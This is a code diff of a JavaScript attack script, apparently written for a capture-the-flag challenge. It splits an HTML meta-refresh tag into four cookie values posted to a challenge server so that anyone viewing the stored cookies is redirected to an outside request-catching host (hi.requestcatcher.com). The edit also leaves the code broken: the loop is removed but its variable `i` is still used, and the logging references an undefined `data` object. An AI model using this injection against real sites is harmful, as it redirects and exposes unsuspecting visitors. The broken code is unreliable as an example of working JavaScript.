@@ -9,23 +9,47 @@ async function makePostRequest(url, data) {
     });
     return await response.json();
 }
+const metaCookies1 = 'a=<meta ';
+const m2 = ' http-equiv="refresh" ';
+const m3 = ' content="0' ;
+const m4 = 'url=https://hi.requestcatcher.com/">';
 
-// Define meta cookies
-const metaCookies = 'a=<meta ; http-equiv="refresh" ; content="0;url=https://hi.requestcatcher.com/">';
 
-// Make four POST requests to set cookies
-for (let i = 0; i < 4; i++) {
-    const url = 'https://example.com/set-cookies';  // Replace with your server endpoint
-    const data = { cookie: `cookie_${i}`, value: `value_${i}`, meta: metaCookies };
+    const url = 'http://host3.metaproblems.com:6020/index.php'; 
+    const data1 = { cookie_name: `cookie_${i}`, value: metaCookies1};
+    const data2 = { cookie_name: `cookie_${i}`, value: m2};
+    const data3 = { cookie_name: `cookie_${i}`, value: m3};
+    const data4 = { cookie_name: `cookie_${i}`, value: m4};
+
     
-    makePostRequest(url, data)
+    makePostRequest(url, data1)
         .then(response => {
             console.log(`Cookie set: ${data.cookie}=${data.value}`);
         })
         .catch(error => {
             console.error('Error setting cookie:', error);
         });
-}
+        makePostRequest(url, data2)
+        .then(response => {
+            console.log(`Cookie set: ${data.cookie}=${data.value}`);
+        })
+        .catch(error => {
+            console.error('Error setting cookie:', error);
+        });
+        makePostRequest(url, data3)
+        .then(response => {
+            console.log(`Cookie set: ${data.cookie}=${data.value}`);
+        })
+        .catch(error => {
+            console.error('Error setting cookie:', error);
+        });
+        makePostRequest(url, data4)
+        .then(response => {
+            console.log(`Cookie set: ${data.cookie}=${data.value}`);
+        })
+        .catch(error => {
+            console.error('Error setting cookie:', error);
+        });
 
 // Redirect to view cookie URL after setting cookies
 window.location.href = 'view_cookie_url';  // Replace with the actual URL to view cookies
